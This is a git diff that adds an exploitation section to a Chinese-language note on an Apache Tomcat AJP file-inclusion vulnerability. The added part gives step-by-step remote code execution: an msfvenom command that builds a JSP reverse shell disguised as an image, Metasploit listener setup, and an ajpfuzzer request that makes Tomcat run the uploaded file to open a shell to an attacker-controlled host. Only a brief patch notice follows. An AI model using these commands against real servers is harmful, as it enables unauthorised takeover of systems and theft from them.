@@ -65,6 +65,54 @@ Apache Tomcat 7.0.0 – 7.0.79
 
 ### 利用方法
 
+**RCE**:
+1. 使用 msf 生成反弹 shell 马，并且监听
+```bash
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.223.129 LPORT=6666 R > shell.png
+
+假设利用上传点，把此图片上传到了目标服务器 / log/shell.png。
+
+在 msf 监听：
+
+msf > use exploit/multi/handler
+
+msf exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
+
+payload => java/jsp_shell_reverse_tcp
+
+msf exploit(multi/handler) > set lhost 192.168.223.129
+
+lhost => 192.168.223.129
+
+msf exploit(multi/handler) > set lport 6666
+
+lport => 6666
+
+msf exploit(multi/handler) >exploit
+```
+2. 发送 AJP 包，获取 shell
+
+使用 AJP 包构造工具来发送 ajp 包，以 ajpfuzzer 为例：
+
+运行：`java -jar ajpfuzzer_v0.6.jar`
+
+连接目标端口：`connect 192.168.223.1 8009`
+
+执行以下命令：
+```shell
+forwardrequest 2 "HTTP/1.1" "/123.jsp" 192.168.223.1 192.168.223.1 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:/","javax.servlet.include.path_info:log/shell.png","javax.servlet.include.servlet_path:/"
+```
+![](/Users/seven/Desktop/pocs/midware/tomcat/tomcat.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70.png)
+
+
+
+可以看到，请求发送成功后，shell.png 被作为 jsp 解析，成功获取目标服务器的 shell。
+
+
+
+![](/Users/seven/Desktop/pocs/midware/tomcat/tomcat.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70-20200810174750806.png)
+
 ### 修复方法
 
 目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：
